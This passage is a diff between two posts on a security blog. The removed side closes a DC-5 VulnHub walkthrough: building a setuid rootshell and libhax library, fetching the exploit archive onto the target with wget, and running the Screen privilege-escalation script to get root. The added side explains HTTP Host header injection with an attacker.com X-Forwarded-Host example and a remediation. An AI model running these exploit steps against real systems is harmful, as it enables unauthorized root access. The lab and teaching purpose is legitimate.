-libhax.c: In <span class="k">function</span> ‘dropshell’:
-libhax.c:7:5: warning: implicit declaration of <span class="k">function</span> ‘chmod’ <span class="o">[</span><span class="nt">-Wimplicit-function-declaration</span><span class="o">]</span>
-    7 |     <span class="nb">chmod</span><span class="o">(</span><span class="s2">"/tmp/rootshell"</span>, 04755<span class="o">)</span><span class="p">;</span>
-      |     ^~~~~
-<span class="nv">$gcc</span> <span class="nt">-o</span> rootshell rootshell.c
-rootshell.c: In <span class="k">function</span> ‘main’:
-rootshell.c:3:5: warning: implicit declaration of <span class="k">function</span> ‘setuid’ <span class="o">[</span><span class="nt">-Wimplicit-function-declaration</span><span class="o">]</span>
-    3 |     setuid<span class="o">(</span>0<span class="o">)</span><span class="p">;</span>
-      |     ^~~~~~
-rootshell.c:4:5: warning: implicit declaration of <span class="k">function</span> ‘setgid’ <span class="o">[</span><span class="nt">-Wimplicit-function-declaration</span><span class="o">]</span>
-    4 |     setgid<span class="o">(</span>0<span class="o">)</span><span class="p">;</span>
-      |     ^~~~~~
-rootshell.c:5:5: warning: implicit declaration of <span class="k">function</span> ‘seteuid’ <span class="o">[</span><span class="nt">-Wimplicit-function-declaration</span><span class="o">]</span>
-    5 |     seteuid<span class="o">(</span>0<span class="o">)</span><span class="p">;</span>
-      |     ^~~~~~~
-rootshell.c:6:5: warning: implicit declaration of <span class="k">function</span> ‘setegid’ <span class="o">[</span><span class="nt">-Wimplicit-function-declaration</span><span class="o">]</span>
-    6 |     setegid<span class="o">(</span>0<span class="o">)</span><span class="p">;</span>
-      |     ^~~~~~~
-rootshell.c:7:5: warning: implicit declaration of <span class="k">function</span> ‘execvp’ <span class="o">[</span><span class="nt">-Wimplicit-function-declaration</span><span class="o">]</span>
-    7 |     execvp<span class="o">(</span><span class="s2">"/bin/sh"</span>, NULL, NULL<span class="o">)</span><span class="p">;</span>
-      |     ^~~~~~
-rootshell.c:7:5: warning: too many arguments to built-in <span class="k">function</span> ‘execvp’ expecting 2 <span class="o">[</span><span class="nt">-Wbuiltin-declaration-mismatch</span><span class="o">]</span>
-</pre></td></tr></tbody></table></code></div></div>
-
-<p>Now we have total 5 files. For simplicity I compress them to tranfer to server.</p>
-<div class="language-bash highlighter-rouge"><div class="code-header">
-        <span data-label-text="Shell"><i class="fas fa-code small"></i></span>
-      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
-2
-3
-4
-5
-6
-7
-8
-</pre></td><td class="rouge-code"><pre><span class="nv">$ls</span>
-41154.sh  libhax.c  libhax.so  rootshell  rootshell.c
-<span class="nv">$tar</span> <span class="nt">-zcvf</span> exploit.tar.gz <span class="k">*</span>
-41154.sh
-libhax.c
-libhax.so
-rootshell
-rootshell.c
-</pre></td></tr></tbody></table></code></div></div>
-<p>Tranfer <code class="language-plaintext highlighter-rouge">exploit.tar.gz</code> to server and decompress the files.</p>
 <div class="language-plaintext highlighter-rouge"><div class="code-header">
         <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span>
       <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
 2
 3
-</pre></td><td class="rouge-code"><pre>$python3 -m http.server 
-Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
-192.168.1.6 - - [31/Aug/2020 14:13:17] "GET /exploit.tar.gz HTTP/1.1" 200 -
+</pre></td><td class="rouge-code"><pre>GET / HTTP/1.1
+Host: www.example.com
+X-Forwarded-Host: www.attacker.com
 </pre></td></tr></tbody></table></code></div></div>
+
+<p>In this example, the attacker sets Host to a legitimate domain (www.example.com), which is the target domain they want to attack. They then use X-Forwarded-Host to specify their own malicious domain (www.attacker.com).</p>
+
+<p>Besides the widely used X-Forwarded-Host header, several other headers serve a similar purpose and may lead to similar security risks. Here’s an improved explanation of these headers:</p>
 
 <div class="language-plaintext highlighter-rouge"><div class="code-header">
         <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span>
@@ -1576,118 +958,15 @@ Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
 2
 3
 4
-5
-6
-7
-8
-9
-10
-11
-12
-13
-14
-15
-16
-17
-18
-19
-20
-21
-</pre></td><td class="rouge-code"><pre>www-data@dc-5:/tmp$ wget http://192.168.1.2:8000/exploit.tar.gz
-converted 'http://192.168.1.2:8000/exploit.tar.gz' (ANSI_X3.4-1968) -&gt; 'http://192.168.1.2:8000/exploit.tar.gz' (UTF-8)
---2020-08-31 18:43:15--  http://192.168.1.2:8000/exploit.tar.gz
-Connecting to 192.168.1.2:8000... connected.
-HTTP request sent, awaiting response... 200 OK
-Length: 4430 (4.3K) [application/gzip]
-Saving to: 'exploit.tar.gz'
-
-exploit.tar.gz      100%[=====================&gt;]   4.33K  --.-KB/s   in 0s     
-
-2020-08-31 18:43:15 (474 MB/s) - 'exploit.tar.gz' saved [4430/4430]
-www-data@dc-5:/tmp$ ls
-exploit.tar.gz
-www-data@dc-5:/tmp$ tar -zxvf exploit.tar.gz 
-41154.sh
-libhax.c
-libhax.so
-rootshell
-rootshell.c
-www-data@dc-5:/tmp$ ls
-41154.sh  exploit.tar.gz  libhax.c  libhax.so  rootshell  rootshell.c
+</pre></td><td class="rouge-code"><pre>X-Host
+X-Forwarded-Server
+X-HTTP-Host-Override
+Forwarded
 </pre></td></tr></tbody></table></code></div></div>
 
-<p>At last grant permission and execute the exploit.</p>
-<div class="language-plaintext highlighter-rouge"><div class="code-header">
-        <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span>
-      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
-2
-3
-4
-5
-6
-7
-8
-9
-</pre></td><td class="rouge-code"><pre>www-data@dc-5:/tmp$ chmod +x 41154.sh 
-www-data@dc-5:/tmp$ ./41154.sh 
-[+] Triggering...
-' from /etc/ld.so.preload cannot be preloaded (cannot open shared object file): ignored.
-[+] done!
-No Sockets found in /tmp/screens/S-www-data.
+<h1 id="remediation">Remediation</h1>
 
-# id
-uid=0(root) gid=0(root) groups=0(root),33(www-data)
-</pre></td></tr></tbody></table></code></div></div>
-
-<h1 id="the-flag">The Flag</h1>
-
-<div class="language-plaintext highlighter-rouge"><div class="code-header">
-        <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span>
-      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
-2
-3
-4
-5
-6
-7
-8
-9
-10
-11
-12
-13
-14
-15
-16
-17
-18
-19
-20
-21
-22
-</pre></td><td class="rouge-code"><pre># cat thisistheflag.txt
-
-
-888b    888 d8b                                                      888      888 888 888 
-8888b   888 Y8P                                                      888      888 888 888 
-88888b  888                                                          888      888 888 888 
-888Y88b 888 888  .d8888b .d88b.       888  888  888  .d88b.  888d888 888  888 888 888 888 
-888 Y88b888 888 d88P"   d8P  Y8b      888  888  888 d88""88b 888P"   888 .88P 888 888 888 
-888  Y88888 888 888     88888888      888  888  888 888  888 888     888888K  Y8P Y8P Y8P 
-888   Y8888 888 Y88b.   Y8b.          Y88b 888 d88P Y88..88P 888     888 "88b  "   "   "  
-888    Y888 888  "Y8888P "Y8888        "Y8888888P"   "Y88P"  888     888  888 888 888 888 
-                                                                                          
-                                                                                          
-
-
-Once again, a big thanks to all those who do these little challenges,
-and especially all those who give me feedback - again, it's all greatly
-appreciated.  :-)
-
-I also want to send a big thanks to all those who find the vulnerabilities
-and create the exploits that make these challenges possible.
-
-</pre></td></tr></tbody></table></code></div></div>
+<p>To enhance security and mitigate potential vulnerabilities related to Host header manipulation, web applications can implement better practices by using the SERVER_NAME variable and creating a dummy vhost for handling unrecognized Host headers.</p>
 
 </div>
 
@@ -1698,35 +977,12 @@ and create the exploits that make these challenges possible.
   <div class="post-meta mb-3">
     <i class="far fa-folder-open fa-fw mr-1"></i>
     
-      <a href='/categories/vulnhub/'>vulnhub</a>,
-      <a href='/categories/dc-series/'>DC-Series</a>
+      <a href='/categories/blog/'>Blog</a>,
+      <a href='/categories/header/'>Header</a>
   </div>
   
 
   <!-- tags -->
-  
-  <div class="post-tags">
-    <i class="fa fa-tags fa-fw mr-1"></i>
-      
-      <a href="/tags/dc-5/"
-          class="post-tag no-text-decoration" >dc-5</a>
-      
-      <a href="/tags/medium/"
-          class="post-tag no-text-decoration" >medium</a>
-      
-      <a href="/tags/suid/"
-          class="post-tag no-text-decoration" >suid</a>
-      
-      <a href="/tags/lfi/"
-          class="post-tag no-text-decoration" >lfi</a>
-      
-      <a href="/tags/log-poisoning/"
-          class="post-tag no-text-decoration" >log poisoning</a>
-      
-      <a href="/tags/screen/"
-          class="post-tag no-text-decoration" >screen</a>
-      
-  </div>
   
 
   <div class="post-tail-bottom
@@ -1759,19 +1015,19 @@ and create the exploits that make these challenges possible.
 
     
       
-        <a href="https://twitter.com/intent/tweet?text=DC+5+Walkthrough+-+Hitesh+Kadu&url=http%3A%2F%2Flocalhost%3A4000%2Fposts%2FDC-5-walkthrough%2F" data-toggle="tooltip" data-placement="top"
+        <a href="https://twitter.com/intent/tweet?text=HTTP+HOST+Header+Injection+-+Hitesh+Kadu&url=http%3A%2F%2Flocalhost%3A4000%2Fposts%2FHTTP-HOST-Header_Injection%2F" data-toggle="tooltip" data-placement="top"
           title="Twitter" target="_blank" rel="noopener" aria-label="Twitter">
           <i class="fa-fw fab fa-twitter"></i>
         </a>
     
       
-        <a href="https://www.facebook.com/sharer/sharer.php?title=DC+5+Walkthrough+-+Hitesh+Kadu&u=http%3A%2F%2Flocalhost%3A4000%2Fposts%2FDC-5-walkthrough%2F" data-toggle="tooltip" data-placement="top"
+        <a href="https://www.facebook.com/sharer/sharer.php?title=HTTP+HOST+Header+Injection+-+Hitesh+Kadu&u=http%3A%2F%2Flocalhost%3A4000%2Fposts%2FHTTP-HOST-Header_Injection%2F" data-toggle="tooltip" data-placement="top"
           title="Facebook" target="_blank" rel="noopener" aria-label="Facebook">
           <i class="fa-fw fab fa-facebook-square"></i>
         </a>
     
       
-        <a href="https://t.me/share/url?url=http%3A%2F%2Flocalhost%3A4000%2Fposts%2FDC-5-walkthrough%2F&text=DC+5+Walkthrough+-+Hitesh+Kadu" data-toggle="tooltip" data-placement="top"
+        <a href="https://t.me/share/url?url=http%3A%2F%2Flocalhost%3A4000%2Fposts%2FHTTP-HOST-Header_Injection%2F&text=HTTP+HOST+Header+Injection+-+Hitesh+Kadu" data-toggle="tooltip" data-placement="top"
           title="Telegram" target="_blank" rel="noopener" aria-label="Telegram">
           <i class="fa-fw fab fa-telegram"></i>
         </a>
@@ -2765,163 +2021,163 @@ and create the exploits that make these challenges possible.
   
 
   
-
-  
-
-  
-
-  
-
-  
-
-
-  
-
-  
-
-  
-
-  
-
-  
-
-  
-
-
-  
-
-  
-
-  
-
-  
-
-  
-
-  
-
-
-  
-
-  
-
-  
-
-  
-
-  
-
-  
-
-
-  
-
-  
-
-  
-
-  
-
-  
-
-  
-
-
-  
-
-  
-
-  
-
-  
-
-  
-
-  
-
-
-  
-
-  
-
-  
-
-  
-
-  
-
-  
-
-
-  
-
-  
-
-  
-
-  
-
-  
-
-  
-
-
-  
-
-  
-
-  
-
-  
-
-  
-
-  
-
-
-  
-
-  
-
-  
-
-  
-
-  
-
-  
-
-
-  
-
-  
-
-  
-
-  
-
-  
-
-  
-
-
-  
-
-  
-
-  
-
-  
-
-  
-
-  
-
-
-  
-
-  
     
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+
   
 
   
@@ -2984,6 +2240,39 @@ and create the exploits that make these challenges possible.
 
 
 
+  
+    
+    
+  
+    
+    
+      
+      
+        
+        
+        
+      
+    
+  
+    
+    
+      
+      
+        
+        
+        
+      
+    
+  
+    
+    
+      
+      
+        
+        
+        
+          
+
 
 
   <div id="related-posts" class="mt-5 mb-2 mb-sm-4">
@@ -2994,7 +2283,7 @@ and create the exploits that make these challenges possible.
       
       
       <div class="card">
-        <a href="/posts/photographer-Writeup/">
+        <a href="/posts/Noter-HTB/">
           <div class="card-body">
             <!--
   Date format snippet
@@ -3006,13 +2295,13 @@ and create the exploits that make these challenges possible.
 
 
 <em class="small"
-    data-ts="1599244200"
+    data-ts="1662143400"
     data-df="ll"
     >
-  Sep  5, 2020
+  Sep  3, 2022
 </em>
 
-            <h3 class="pt-0 mt-1 mb-3" data-toc-skip> Photographer: 1 Vulnhub Writeup</h3>
+            <h3 class="pt-0 mt-1 mb-3" data-toc-skip>Noter HTB</h3>
             <div class="text-muted small">
               <p>
                 
@@ -3021,7 +2310,7 @@ and create the exploits that make these challenges possible.
 
 
 
-                Photographer is an OSCP-like box. We found initial credentials for the Koken CMS by enumerating SMB shares. We upload a malicious php file to get a shell. In-home directory of daisa we found the us...
+                Noter is a medium Linux box, which starts with decrypting the flask session cookie. The cookie has a weak password which can be obtained by brute forcing. There is a quiet enumeration to find out t...
               </p>
             </div>
           </div>
@@ -3031,7 +2320,7 @@ and create the exploits that make these challenges possible.
       
       
       <div class="card">
-        <a href="/posts/Cybox-1.1-Vulnhub-Writeup/">
+        <a href="/posts/Talkative-HTB/">
           <div class="card-body">
             <!--
   Date format snippet
@@ -3043,13 +2332,13 @@ and create the exploits that make these challenges possible.
 
 
 <em class="small"
-    data-ts="1610217000"
+    data-ts="1661538600"
     data-df="ll"
     >
-  Jan 10, 2021
+  Aug 27, 2022
 </em>
 
-            <h3 class="pt-0 mt-1 mb-3" data-toc-skip>Cybox:1.1 Vulnhub Writeup</h3>
+            <h3 class="pt-0 mt-1 mb-3" data-toc-skip>Talkative HTB</h3>
             <div class="text-muted small">
               <p>
                 
@@ -3058,7 +2347,7 @@ and create the exploits that make these challenges possible.
 
 
 
-                To solve Cybox 1.1, we’ll find subdomains. First, we create the user on the register.cybox.company subdomain, then with the email id of the created user we create another account on monitor.cybox.c...
+                On Talkative, we start with command injection in the Jamovi application, which gives us the shell in a docker container. In-home dir we found the omv file which contains usernames and passwords. We...
               </p>
             </div>
           </div>
@@ -3068,7 +2357,7 @@ and create the exploits that make these challenges possible.
       
       
       <div class="card">
-        <a href="/posts/Election-Walkthrough/">
+        <a href="/posts/TimeLapse-HackTheBox/">
           <div class="card-body">
             <!--
   Date format snippet
@@ -3080,13 +2369,13 @@ and create the exploits that make these challenges possible.
 
 
 <em class="small"
-    data-ts="1599157800"
+    data-ts="1660933800"
     data-df="ll"
     >
-  Sep  4, 2020
+  Aug 20, 2022
 </em>
 
-            <h3 class="pt-0 mt-1 mb-3" data-toc-skip>Election Walkthrough</h3>
+            <h3 class="pt-0 mt-1 mb-3" data-toc-skip>TimeLapse HackTheBox</h3>
             <div class="text-muted small">
               <p>
                 
@@ -3095,7 +2384,8 @@ and create the exploits that make these challenges possible.
 
 
 
-                It is an OSCP-like box, where the initial credentials can be found by converting binary to ascii. We found another creds in system log file. Used this creds to access ssh and priv esc to root by ex...
+                Timelapse is an Easy Windows that starts with accessing the SMB share. In SMB shares there is a zip file. We crack the zip file using John. The ZIP files contain the encrypted PFX file.
+Again using...
               </p>
             </div>
           </div>
@@ -3114,17 +2404,17 @@ and create the exploits that make these challenges possible.
 
 <div class="post-navigation d-flex justify-content-between">
   
-  <a href="/posts/DC-4-Walkthrough/" class="btn btn-outline-primary"
+  <a href="/posts/Noter-HTB/" class="btn btn-outline-primary"
     prompt="Older">
-    <p>DC 4 Walkthrough</p>
+    <p>Noter HTB</p>
   </a>
   
 
   
-  <a href="/posts/DC-6-Walkthrough/" class="btn btn-outline-primary"
+  <div class="btn btn-outline-primary disabled"
     prompt="Newer">
-    <p>DC 6 Walkthrough</p>
-  </a>
+    <p>-</p>
+  </div>
   
 
 </div>
